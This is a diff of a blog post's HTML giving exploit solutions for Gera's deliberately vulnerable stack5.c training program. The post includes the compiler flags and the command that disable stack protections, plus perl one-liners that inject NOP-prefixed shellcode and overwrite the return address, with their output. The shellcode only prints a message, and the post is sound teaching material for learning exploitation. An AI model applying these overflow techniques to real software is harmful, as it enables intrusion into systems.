@@ -34,15 +34,7 @@
                   <a href="/2013/geras-wuos-stack4-solutions.html">&lt&lt;</a> published on 05/Jan/2013<a href="/2013/libemu-shellcode-detection.html"> &gt;&gt;</i></a><br/>
                 </p>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                               <div class="post-content">
-          <p>Following is the part 5 in the series of posts I started back in August
-2012 with an aim to provide an analysis and possible solutions for the
-vulnerable programs provided by
-<a href="http://corelabs.coresecurity.com/index.php?module=Wiki&amp;action=view&amp;type=researcher&amp;name=Gerardo_Richarte">Gera</a>
-at his <a href="http://community.corest.com/%7Egera/InsecureProgramming/">Insecure
-Programming</a>
-by example page.</p>
-
-<p>This post follows the <a href="/2013/geras-wuos-stack4-solutions.html">Gera&#8217;s Warming Up on Stack #4 -
+          <p>This post follows the <a href="/2013/geras-wuos-stack4-solutions.html">Gera&#8217;s Warming Up on Stack #4 -
 Solutions</a> post and if you have
 not read it, I request you to please do so. Most of the concepts are
 very similar and since they have been already talked about, I&#8217;ll not be
@@ -52,17 +44,17 @@ reiterating them here.</p>
 <a href="http://community.corest.com/%7Egera/InsecureProgramming/stack5.html">stack5.c</a>
 program:</p>
 
-<div class="codehilite"><pre><span></span><code><span class="cm">/* stack5.c                                     *</span>
-<span class="cm"> * specially crafted to feed your brain by gera */</span>
-<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
-    <span class="kt">int</span> <span class="n">cookie</span><span class="p">;</span>
-    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">80</span><span class="p">];</span>
-    <span class="n">printf</span><span class="p">(</span><span class="o">*</span><span class="nl">buf</span><span class="p">:</span> <span class="o">%</span><span class="mi">08</span><span class="n">x</span> <span class="nl">cookie</span><span class="p">:</span> <span class="o">%</span><span class="mi">08</span><span class="n">x</span><span class="err">\</span><span class="n">n</span><span class="o">*</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cookie</span><span class="p">);</span>
-    <span class="n">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
-    <span class="k">if</span> <span class="p">(</span><span class="n">cookie</span> <span class="o">==</span> <span class="mh">0x000a0d00</span><span class="p">)</span>
-        <span class="n">printf</span><span class="p">(</span><span class="o">*</span><span class="n">you</span> <span class="n">lose</span><span class="o">!</span><span class="err">\</span><span class="n">n</span><span class="o">*</span><span class="p">);</span>
-<span class="p">}</span>
-</code></pre></div>
+<pre><code>/* stack5.c                                     *
+ * specially crafted to feed your brain by gera */
+int main() {
+    int cookie;
+    char buf[80];
+    printf(*buf: %08x cookie: %08x\n*, &amp;buf, &amp;cookie);
+    gets(buf);
+    if (cookie == 0x000a0d00)
+        printf(*you lose!\n*);
+}
+</code></pre>
 
 <p>The above program too accepts user-input through the gets function and
 then looks for a specific value in a local variable named <code>cookie</code>. If
@@ -111,15 +103,15 @@ through an environment var and overwrite EIP with its address</li>
 
 <p>Here&#8217;s a brief description of the test system:</p>
 
-<div class="codehilite"><pre><span></span><code><span class="c1"># cat /etc/lsb-release | grep DESC ; uname -a | cut -d&#39; &#39; -f1,3,12-13 ; gcc --version | grep gcc ; cat /proc/cpuinfo | grep -E &#39;(vendor|model|flags)&#39;</span>
-<span class="nv">DISTRIB_DESCRIPTION</span><span class="o">=</span>*Ubuntu <span class="m">10</span>.04.2 LTS*
-Linux <span class="m">2</span>.6.38 i686 GNU/Linux
-gcc <span class="o">(</span>Ubuntu <span class="m">4</span>.4.3-4ubuntu5<span class="o">)</span> <span class="m">4</span>.4.3
+<pre><code># cat /etc/lsb-release | grep DESC ; uname -a | cut -d' ' -f1,3,12-13 ; gcc --version | grep gcc ; cat /proc/cpuinfo | grep -E '(vendor|model|flags)'
+DISTRIB_DESCRIPTION=*Ubuntu 10.04.2 LTS*
+Linux 2.6.38 i686 GNU/Linux
+gcc (Ubuntu 4.4.3-4ubuntu5) 4.4.3
 vendor_id   : GenuineIntel
-model       : <span class="m">37</span>
-model name  : Intel<span class="o">(</span>R<span class="o">)</span> Core<span class="o">(</span>TM<span class="o">)</span> i3 CPU       M <span class="m">350</span>  @ <span class="m">2</span>.27GHz
+model       : 37
+model name  : Intel(R) Core(TM) i3 CPU       M 350  @ 2.27GHz
 flags       : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx lm constant_tsc up pni monitor ssse3 lahf_l
-</code></pre></div>
+</code></pre>
 
 <h2>Solution #1: Inject a NOP-prefixed printf(you win!) shellcode and overwrite EIP with its address</h2>
 
@@ -127,12 +119,12 @@ flags       : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat 
 <a href="http://community.corest.com/%7Egera/InsecureProgramming/stack4.html">stack4.c</a>
 for Solution #1:</p>
 
-<div class="codehilite"><pre><span></span><code><span class="c1"># gcc -mpreferred-stack-boundary=2 -fno-stack-protector -z execstack -o stack5 stack5.c 2&gt;/dev/null ; readelf -l stack5 | grep GNU_STACK</span>
+<pre><code># gcc -mpreferred-stack-boundary=2 -fno-stack-protector -z execstack -o stack5 stack5.c 2&gt;/dev/null ; readelf -l stack5 | grep GNU_STACK
   GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
-<span class="c1">#</span>
-<span class="c1"># echo 0 &gt;/proc/sys/kernel/randomize_va_space ; cat /proc/sys/kernel/randomize_va_space</span>
-<span class="m">0</span>
-</code></pre></div>
+#
+# echo 0 &gt;/proc/sys/kernel/randomize_va_space ; cat /proc/sys/kernel/randomize_va_space
+0
+</code></pre>
 
 <p>The Null-free, NOP-prefixed <code>printf(you win!)</code> shellcode we used to
 exploit
@@ -141,36 +133,36 @@ in the <a href="/2012/8/27/geras-wuos-stack1-solutions/">Gera&#8217;s Warming Up
 Solutions</a> post could be reused
 here:</p>
 
-<div class="codehilite"><pre><span></span><code><span class="c1"># ./stack5</span>
-buf: bffff4c4 <span class="sb">``</span>cookie<span class="sb">``</span>: bffff514
-<span class="c1">#</span>
-<span class="c1"># ./stack5</span>
-buf: bffff4c4 <span class="sb">``</span>cookie<span class="sb">``</span>: bffff514
-<span class="c1"># ./stack5</span>
-buf: bffff4c4 <span class="sb">``</span>cookie<span class="sb">``</span>: bffff514
-<span class="c1">#</span>
-<span class="c1"># perl -e &#39;print *\x90*x51 . *\xeb\x16\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x09\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21* . *\xc4\xf4\xff\xbf*&#39; | ./stack5</span>
-buf: bffff4c4 <span class="sb">``</span>cookie<span class="sb">``</span>: bffff514
+<pre><code># ./stack5
+buf: bffff4c4 ``cookie``: bffff514
+#
+# ./stack5
+buf: bffff4c4 ``cookie``: bffff514
+# ./stack5
+buf: bffff4c4 ``cookie``: bffff514
+#
+# perl -e 'print *\x90*x51 . *\xeb\x16\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x09\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21* . *\xc4\xf4\xff\xbf*' | ./stack5
+buf: bffff4c4 ``cookie``: bffff514
 you win!#
-</code></pre></div>
+</code></pre>
 
 <h2>Solution #2: Inject a NOP-prefixed printf(you win!) shellcode through an environment var and overwrite EIP with its address</h2>
 
 <p>Lets get straight to the exploitation:</p>
 
-<div class="codehilite"><pre><span></span><code><span class="c1"># echo $WINCODE | hexdump -C</span>
-<span class="m">00000000</span>  eb <span class="m">16</span> <span class="m">31</span> c0 <span class="m">31</span> db <span class="m">31</span> d2  b0 <span class="m">04</span> b3 <span class="m">01</span> <span class="m">59</span> b2 <span class="m">20</span> <span class="nb">cd</span>  <span class="p">|</span>..1.1.1.....Y. .<span class="p">|</span>
-<span class="m">00000010</span>  <span class="m">80</span> <span class="m">31</span> c0 <span class="m">40</span> <span class="m">31</span> db <span class="nb">cd</span> <span class="m">80</span>  e8 e5 ff ff ff <span class="m">79</span> 6f <span class="m">75</span>  <span class="p">|</span>.1.@1........you<span class="p">|</span>
-<span class="m">00000020</span>  <span class="m">20</span> <span class="m">77</span> <span class="m">69</span> 6e <span class="m">21</span> <span class="m">20</span> 0d 0a                           <span class="p">|</span> win! ..<span class="p">|</span>
-<span class="m">00000028</span>
-<span class="c1">#</span>
-<span class="c1"># ./getenvaddr WINCODE ./stack5</span>
-<span class="o">[</span>+<span class="o">]</span> WINCODE: 0xbffff726
-<span class="c1">#</span>
-<span class="c1"># perl -e &#39;print *\x90*x88 . *\x26\xf7\xff\xbf*&#39; | ./stack5</span>
-buf: bffff4c4 <span class="sb">``</span>cookie<span class="sb">``</span>: bffff514
+<pre><code># echo $WINCODE | hexdump -C
+00000000  eb 16 31 c0 31 db 31 d2  b0 04 b3 01 59 b2 20 cd  |..1.1.1.....Y. .|
+00000010  80 31 c0 40 31 db cd 80  e8 e5 ff ff ff 79 6f 75  |.1.@1........you|
+00000020  20 77 69 6e 21 20 0d 0a                           | win! ..|
+00000028
+#
+# ./getenvaddr WINCODE ./stack5
+[+] WINCODE: 0xbffff726
+#
+# perl -e 'print *\x90*x88 . *\x26\xf7\xff\xbf*' | ./stack5
+buf: bffff4c4 ``cookie``: bffff514
 you win!
-</code></pre></div>
+</code></pre>
 
 <p>So, we have now successfully exploited the
 <a href="http://community.corest.com/%7Egera/InsecureProgramming/stack5.html">stack5.c</a>
